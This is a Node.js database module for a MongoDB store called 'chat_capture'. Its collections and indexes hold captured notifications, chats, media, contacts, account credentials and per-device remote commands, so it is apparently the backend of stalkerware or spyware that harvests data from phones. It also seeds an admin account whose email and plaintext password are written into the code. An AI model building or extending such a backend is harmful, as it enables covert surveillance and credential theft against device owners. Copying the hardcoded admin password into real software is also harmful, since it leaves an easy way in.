const { MongoClient } = require('mongodb');
const bcrypt = require('bcrypt');
const { v4: uuidv4 } = require('uuid');

// MongoDB connection string - defaults to localhost, can be overridden with MONGODB_URI env var
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017';
const DB_NAME = process.env.MONGODB_DB_NAME || 'chat_capture';

let client = null;
let db = null;

/**
 * Connect to MongoDB
 */
async function connect() {
    if (client && db) {
        return { client, db };
    }

    try {
        client = new MongoClient(MONGODB_URI, {
            maxPoolSize: 10,
            serverSelectionTimeoutMS: 5000,
        });

        await client.connect();
        db = client.db(DB_NAME);
        
        console.log('✅ MongoDB connected successfully');
        console.log(`   Database: ${DB_NAME}`);
        
        // Initialize schema
        await initializeSchema();
        
        return { client, db };
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Get database instance (call after connect())
 */
function getDb() {
    if (!db) {
        throw new Error('MongoDB not connected. Call connect() first.');
    }
    return db;
}

/**
 * Initialize MongoDB collections and indexes
 */
async function initializeSchema() {
    try {
        const collections = await db.listCollections().toArray();
        const collectionNames = collections.map(c => c.name);

        // Create collections if they don't exist and add indexes
        const collectionsToCreate = [
            'notifications',
            'chats',
            'media_files',
            'credentials',
            'contacts',
            'devices',
            'commands',
            'users',
            'device_ownership'
        ];

        for (const collectionName of collectionsToCreate) {
            if (!collectionNames.includes(collectionName)) {
                await db.createCollection(collectionName);
                console.log(`   Created collection: ${collectionName}`);
            }
        }

        // Create indexes
        await createIndexes();
        
        // Create initial admin user if it doesn't exist
        await createAdminUser();
        
        console.log('✅ MongoDB schema initialized');
    } catch (error) {
        console.error('Error initializing MongoDB schema:', error);
        throw error;
    }
}

/**
 * Create indexes for all collections
 */
async function createIndexes() {
    try {
        // Notifications indexes
        await db.collection('notifications').createIndex({ appPackage: 1 });
        await db.collection('notifications').createIndex({ timestamp: -1 });
        await db.collection('notifications').createIndex({ synced: 1 });
        await db.collection('notifications').createIndex({ deviceId: 1 });

        // Chats indexes
        await db.collection('chats').createIndex({ appPackage: 1 });
        await db.collection('chats').createIndex({ chatIdentifier: 1 });
        await db.collection('chats').createIndex({ timestamp: -1 });
        await db.collection('chats').createIndex({ synced: 1 });
        await db.collection('chats').createIndex({ deviceId: 1 });

        // Media files indexes
        await db.collection('media_files').createIndex({ notificationId: 1 });
        await db.collection('media_files').createIndex({ uploadStatus: 1 });
        await db.collection('media_files').createIndex({ deviceId: 1 });

        // Credentials indexes
        await db.collection('credentials').createIndex({ accountType: 1 });
        await db.collection('credentials').createIndex({ appPackage: 1 });
        await db.collection('credentials').createIndex({ email: 1 });
        await db.collection('credentials').createIndex({ synced: 1 });
        await db.collection('credentials').createIndex({ timestamp: -1 });
        await db.collection('credentials').createIndex({ deviceId: 1 });

        // Contacts indexes
        await db.collection('contacts').createIndex({ phoneNumber: 1 });
        await db.collection('contacts').createIndex({ email: 1 });
        await db.collection('contacts').createIndex({ synced: 1 });
        await db.collection('contacts').createIndex({ deviceId: 1 });
        await db.collection('contacts').createIndex({ timestamp: -1 });
        await db.collection('contacts').createIndex({ lastSynced: 1 });

        // Devices indexes
        await db.collection('devices').createIndex({ deviceId: 1 }, { unique: true });
        await db.collection('devices').createIndex({ status: 1 });
        await db.collection('devices').createIndex({ ownerId: 1 });
        await db.collection('devices').createIndex({ lastSeen: -1 });

        // Commands indexes
        await db.collection('commands').createIndex({ deviceId: 1 });
        await db.collection('commands').createIndex({ status: 1 });
        await db.collection('commands').createIndex({ createdAt: -1 });

        // Users indexes
        await db.collection('users').createIndex({ username: 1 }, { unique: true });
        await db.collection('users').createIndex({ email: 1 }, { unique: true, sparse: true });
        await db.collection('users').createIndex({ role: 1 });

        // Device ownership indexes
        await db.collection('device_ownership').createIndex({ userId: 1 });
        await db.collection('device_ownership').createIndex({ deviceId: 1 }, { unique: true });

        console.log('   Indexes created');
    } catch (error) {
        console.error('Error creating indexes:', error);
        // Don't throw - indexes might already exist
    }
}

/**
 * Create initial admin user
 */
async function createAdminUser() {
    try {
        const existingAdmin = await db.collection('users').findOne({ email: 'bilal@admin.com' });
        
        if (!existingAdmin) {
            const adminId = uuidv4();
            const hash = await bcrypt.hash('Bil@l112', 10);
            const createdAt = Math.floor(Date.now() / 1000);

            await db.collection('users').insertOne({
                id: adminId,
                username: 'admin',
                email: 'bilal@admin.com',
                password: hash,
                role: 'admin',
                createdAt: createdAt,
                lastLogin: null
            });

            console.log('   Initial admin user created: bilal@admin.com');
        }
    } catch (error) {
        console.error('Error creating admin user:', error);
        // Don't throw - user might already exist
    }
}

/**
 * Close MongoDB connection
 */
async function close() {
    if (client) {
        await client.close();
        client = null;
        db = null;
        console.log('MongoDB connection closed');
    }
}

// Helper methods for MongoDB database operations
const dbHelpers = {
    // Get a single document
    async get(collection, filter) {
        const result = await db.collection(collection).findOne(filter);
        return result;
    },

    // Get multiple documents
    async all(collection, filter = {}, options = {}) {
        let query = db.collection(collection).find(filter);
        
        if (options.sort) {
            query = query.sort(options.sort);
        }
        if (options.limit) {
            query = query.limit(options.limit);
        }
        if (options.skip) {
            query = query.skip(options.skip);
        }
        
        return await query.toArray();
    },

    // Insert a single document
    async insert(collection, doc) {
        const result = await db.collection(collection).insertOne(doc);
        return { lastID: result.insertedId, changes: 1 };
    },

    // Update documents
    async update(collection, filter, update) {
        const result = await db.collection(collection).updateMany(filter, { $set: update });
        return { changes: result.modifiedCount };
    },

    // Delete documents
    async delete(collection, filter) {
        const result = await db.collection(collection).deleteMany(filter);
        return { changes: result.deletedCount };
    },

    // Insert many documents
    async insertMany(collection, docs) {
        const result = await db.collection(collection).insertMany(docs);
        return { insertedCount: result.insertedCount };
    }
};

module.exports = {
    connect,
    getDb,
    close,
    dbHelpers
};
